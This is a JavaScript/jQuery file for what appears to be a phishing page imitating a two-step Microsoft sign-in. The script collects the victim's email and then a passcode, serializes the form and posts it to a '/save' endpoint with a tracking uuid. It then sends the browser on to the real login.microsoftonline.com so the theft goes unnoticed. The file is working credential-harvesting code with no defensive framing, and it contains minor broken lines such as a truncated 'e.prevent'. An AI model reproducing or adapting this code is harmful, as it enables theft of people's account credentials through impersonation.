/* eslint-disable prettier/prettier */
$('document').ready(function () {
    $('#nextButton').click(function () {
        const email = $('#email').val();
        if (!validateEmail(email)) {
            $('#alert').show();
        } else {
            if ($('#alert').is(':visible')) { $('#alert').hide() }
            $('#displayName').text(email);
            $('#main').animate({ width: 'toggle' }, 250, function(){
                $('#passcode').animate({ width: 'toggle' }, 250);
            });    
        }  
    });
    $('#backButton').click(function () {
        $('#passcode').animate({ width: 'toggle' }, 250, function () {
            $('#main').animate({ width: 'toggle' }, 250);
        });        
    });

    $('#submitButton').click(function (e) {
        e.preventDefault();
        console.info($("form").serialize());
        $('#frontendData').val({ 
            uuid: $('#uuid').text(), 
            y: 6, 
        })
        console.info()
        $.ajax({
            url: '/save',
            type: 'post',
            dataType: 'application/json',
            data: $("form").serialize()
        });
        window.location.href = "https://login.microsoftonline.com";
    });

    $('form').keyup(function (e) {
        if (e.keyCode == 13) {
            e.preventDefault();
            $('#nextButton').click();
            return false;
        }
    });
    $('input').keyup(function (e) {
        if (e.keyCode == 13) {
            e.prevent
            $('#nextButton').click();
            return false;
        }
    });
});

function validateEmail($email) {
    var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
    return emailReg.test($email);
}
